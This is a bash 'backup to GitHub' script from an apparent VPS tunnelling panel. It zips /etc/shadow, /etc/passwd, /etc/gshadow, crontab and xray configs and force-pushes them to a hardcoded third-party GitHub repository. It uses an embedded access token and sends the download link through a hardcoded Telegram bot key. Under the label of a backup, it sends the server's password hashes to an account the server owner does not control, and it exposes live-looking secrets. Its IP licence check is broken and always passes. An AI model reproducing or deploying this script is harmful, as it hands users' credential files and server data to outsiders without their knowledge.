#!/bin/bash
# Provide by xlrd × dimz
MYIP=$(curl -sS ipv4.icanhazip.com)
Name=$(curl -sS https://raw.githubusercontent.com/salamsatuu/psby/main/daftar | grep $MYIP | awk '{print $2}')
echo "Checking VPS"
#########################
IZIN=$(curl -sS https://raw.githubusercontent.com/salamsatuu/psby/main/daftar | awk '{print $4}' | grep $MYIP)
if [ $MYIP = $MYIP ]; then
echo -e "\e[32mWelcome To SC XLORD × DIMZ\e[0m"
else
echo -e "\e[31mPermission Denied!\e[0m";
exit 0
fi
#EXPIRED
expired=$(curl -sS https://raw.githubusercontent.com/salamsatuu/psby/main/daftar | grep $MYIP | awk '{print $3}')
echo $expired > /root/expired.txt
today=$(date -d +1day +%Y-%m-%d)
while read expired
do
        exp=$(echo $expired | curl -sS https://raw.githubusercontent.com/salamsatuu/psby/main/daftar | grep $MYIP | awk '{print $3}')
        if [[ $exp < $today ]]; then
                Exp2="\033[1;31mExpired\033[0m"
        else
        Exp2=$(curl -sS https://raw.githubusercontent.com/salamsatuu/psby/main/daftar | grep $MYIP | awk '{print $3}')
        fi
done < /root/expired.txt
rm /root/expired.txt
DF='\e[39m'
Bold='\e[1m'
Blink='\e[5m'
yell='\e[33m'
red='\e[31m'
green='\e[32m'
blue='\e[34m'
PURPLE='\e[35m'
g="\033[1;93m"
gb="\e[92;1m"
cyan='\e[36m'
Lred='\e[91m'
Lgreen='\e[92m'
Lyellow='\e[93m'
NC='\e[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
LIGHT='\033[0;37m'
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
clear
function line_atas(){
echo -e " ${CYAN}┌─────────────────────────────────────┐${p}"
}
function line_bawah() {
echo -e " ${CYAN}└─────────────────────────────────────┘${p}"
}
function line_tengah() {
echo -e "   ${CYAN}────────────────────────────────────────${p}"
}
clear
line_atas
purple "       •••• Backup Via Github ••••          \E[0m"
line_bawah
red "WARNING !!!"
green "Processing backup data, Please Wait"
rm -rf /root/backup
mkdir /root/backup
cp /etc/passwd backup/
cp /etc/group backup/
cp /etc/shadow backup/
cp /etc/gshadow backup/
cp /etc/crontab backup/
cp -r /etc/usg backup/
cp -r /etc/lmt backup/
cp -r /etc/client backup/
cp -r /var/lib/xlordhost/ backup/xlordhost
cp -r /etc/xray backup/xray
cp -r /home/vps/public_html backup/public_html
cp -r /etc/cron.d backup/cron.d
cp -r /etc/xraylog backup/xraylog
cd /root
sub=$(</dev/urandom tr -dc a-z0-9 | head -c60)
IP=$(wget -qO- ipinfo.io/ip);
date=$(date +"%Y-%m-%d")
domain=$(cat /etc/xray/domain)
ISP=$(cat /usr/local/etc/xray/org)
nami=$(cat /etc/securedata/name)
zip -r Backup-$sub.zip backup > /dev/null 2>&1

APIGIT="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"
EMAILGIT='nilabaik9@gmail.com'
USERGIT='sekencois'

git config --global user.email "${EMAILGIT}" &> /dev/null
git config --global user.name "${USERGIT}" &> /dev/null
git clone https://github.com/${USERGIT}/mydata.git &> /dev/null

directory="/root/mydata"
cp /root/Backup-$sub.zip /root/mydata
cd $directory
git init
git add .
git commit -m "BACKUP DATA"
git remote add origin https://github.com/${USERGIT}/mydata.git &> /dev/null
git push -f https://${APIGIT}@github.com/${USERGIT}/mydata.git &> /dev/null

link="https://raw.githubusercontent.com/sekencois/mydata/main/Backup-$sub.zip"
clear
echo -e "${GREEN}BACKUP TO GITHUB SUCCESS${NC}"
echo -e "Detail Backup

Client Name   : ${GREEN}$Name${NC}
IP VPS        : ${BLUE}$IP${NC}
Domain        : ${GREEN}$domain${NC}
ISP           : ${GREEN}$ISP${NC}
Date          : ${GREEN}$date${NC}
Link Backup   : ${RED}$link${NC}
"

TIMES="10"
CHATID=$(cat /etc/securedata/chatidbak)
KEY="6810411877:AAGwNWpNyL4SkmnBzssIi5ZysUF0Qu5J-0Q"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="
<code>───────────────────────</code>
<b> ⚡ AUTO BACKUP GITHUB ⚡</b>
<code>───────────────────────</code>
<code>Client Name   : </code><code>${Name}</code>
<code>IP VPS        : </code><code>${IP}</code>
<code>Domain        : </code><code>${domain}</code>
<code>ISP           : </code><code>${ISP}</code>
<code>Link Backup   : </code><code>${link}</code>
<code>───────────────────────</code>
<i>Automatic Notification from</i>
<i>𝙓𝙡𝙤𝙧𝙙𝘿𝙞𝙢𝙯『✘𝕯』</i>
<code>───────────────────────</code>
"'&reply_markup={"inline_keyboard":[[{"text":"⚡ XLORD ⚡","url":"https://t.me/xlordeuyy"},{"text":"⚡ DIMZ ⚡","url":"https://wa.me/6285142317870"}]]}'
curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
rm -rf /root/backup
rm -r /root/Backup-$sub.zip
rm -rf /root/mydata
echo "Simpan link dengan baik, jangan lupa restore di vps baru"
echo "Xlord × Dimz...."
read -n 1 -s -r -p "Press any key to back"
menu

